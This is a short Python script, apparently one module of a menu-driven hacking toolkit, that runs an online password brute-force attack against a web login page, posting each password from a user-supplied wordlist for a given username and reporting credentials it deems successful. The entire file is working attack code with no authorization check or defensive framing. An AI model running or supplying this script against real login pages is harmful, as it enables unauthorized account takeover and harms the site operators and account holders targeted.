#!/usr/bin/env python3
import requests
import sys

def run():
    print("\n[+] Starting Basic Brute Force...")
    target = input("Enter target login URL (e.g. http://example.com/login.php): ")
    username = input("Enter username: ")
    wordlist_path = input("Enter path to password wordlist (e.g. passwords.txt): ")

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print("[-] Wordlist file not found!")
        input("Press Enter to return to the main menu...")
        return

    if not passwords:
        print("[-] Wordlist is empty!")
        input("Press Enter to return to the main menu...")
        return

    print(f"[*] Loaded {len(passwords)} passwords.")
    print("[*] Starting brute force...\n")

    for idx, password in enumerate(passwords, 1):
        print(f"[*] Trying: {username}:{password}")

        try:
            response = requests.post(target, data={"username": username, "password": password}, timeout=5)

            # Başarılı giriş kontrolü (çok basit)
            if "invalid" not in response.text.lower() and "error" not in response.text.lower():
                print(f"\n[+] SUCCESS! Credentials found: {username}:{password}")
                print("[+] Stopping brute force...")
                input("Press Enter to return to the main menu...")
                return
            else:
                print(f"[-] Failed: {username}:{password}")

        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error: {target}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout: {target}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")

        if idx % 10 == 0:
            print(f"[*] Completed {idx}/{len(passwords)} attempts...")

    print("\n[-] Brute force completed. No valid credentials found.")
    input("Press Enter to return to the main menu...")
